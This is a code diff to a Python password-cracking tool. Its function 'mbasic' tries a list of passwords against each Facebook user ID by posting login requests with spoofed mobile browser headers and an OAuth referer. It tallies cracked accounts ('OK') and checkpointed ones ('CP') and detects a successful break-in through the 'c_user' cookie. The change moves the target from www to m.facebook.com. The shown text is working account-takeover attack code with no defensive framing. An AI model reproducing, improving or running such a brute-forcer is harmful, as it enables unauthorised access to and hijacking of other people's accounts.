@@ -1751,7 +1751,7 @@ def mbasic(uid,pwx,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M4-ATOM) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(M1-ATOM) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1777,7 +1777,7 @@ def mbasic(uid,pwx,tl):
             'prefill_source': '',
             'prefill_type': '',}
             headers ={
-            'Host': 'www.facebook.com',
+            'Host': 'm.facebook.com',
             'method': 'POST',
             'path': '/login/Device-based/login/async/',
             'scheme': 'https',
@@ -1797,8 +1797,8 @@ def mbasic(uid,pwx,tl):
             'user-agent': ua,
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'dnt': '1',
-            'origin': 'https://www.facebook.com',
-            'referer': 'https://www.facebook.com/?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1728023954721%26e2e%3D%257B%2522init%2522%253A1728023954721%257D%26ies%3D0%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D77fcd107-69c1-47ea-900d-eb59cc66559b%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DgYWWg5ZTt6cKDUGibjTfrD1ZdDSG6_gsHx7Xrsd1liI%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd5dc1c21-09db-4859-ae13-e33582ae635c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            'origin': 'https://m.facebook.com',
+            'referer': 'https://m.facebook.com/?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1728023954721%26e2e%3D%257B%2522init%2522%253A1728023954721%257D%26ies%3D0%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D77fcd107-69c1-47ea-900d-eb59cc66559b%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DgYWWg5ZTt6cKDUGibjTfrD1ZdDSG6_gsHx7Xrsd1liI%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd5dc1c21-09db-4859-ae13-e33582ae635c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
             'x-requested-with': 'mark.via.gp',
             'sec-fetch-site': 'none',
             'sec-fetch-mode': 'navigate',
@@ -1807,7 +1807,7 @@ def mbasic(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
+            url = "https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1728023954721%26e2e%3D%257B%2522init%2522%253A1728023954721%257D%26ies%3D0%26sdk%3Dandroid-16.2.0%26sso%3Dchrome_custom_tab%26nonce%3D77fcd107-69c1-47ea-900d-eb59cc66559b%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DgYWWg5ZTt6cKDUGibjTfrD1ZdDSG6_gsHx7Xrsd1liI%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd5dc1c21-09db-4859-ae13-e33582ae635c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d5dc1c21-09db-4859-ae13-e33582ae635c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25223jqsm1g6hs80f2sprrok%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
